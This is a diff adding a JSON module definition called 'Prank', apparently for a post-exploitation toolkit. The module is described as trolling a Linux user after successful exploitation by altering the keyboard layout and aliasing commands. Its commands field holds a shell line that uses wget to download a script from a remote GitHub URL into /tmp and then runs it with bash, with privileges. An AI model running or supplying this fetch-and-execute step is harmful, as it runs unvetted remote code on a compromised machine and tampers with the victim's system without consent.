@@ -1,0 +1,20 @@
+{
+    "base": {
+      "name": "Prank",
+      "author": ["Dan Borges (@ahhh)"],
+      "credits": ["Sebastian Paaske"],
+      "path": ["linux", "x64", "bash", "troll", "Prank.json"],
+      "platform": "linux",
+      "arch": "x64",
+      "lang": "bash",
+      "privilege": true,
+      "notes": "http://prank.coq.dk",
+      "remote": "https://raw.githubusercontent.com/Eckankar/prank-script/master/prank.sh",
+      "local": ["data", "src", "eckankar", "prank", "prank.sh"],
+      "options": [],
+      "description": "Prank is a bash script used to make various random changes to the user interface, such as changing the keyboard layout or remapping commands with aliases. It is intended to troll the linux user after successful exploitation.",
+      "commands": [
+        "/bin/sh", "-c", "\"wget -O /tmp/prank.sh https://raw.githubusercontent.com/Eckankar/prank-script/master/prank.sh; /bin/bash /tmp/prank.sh;\""
+      ]
+    }
+}
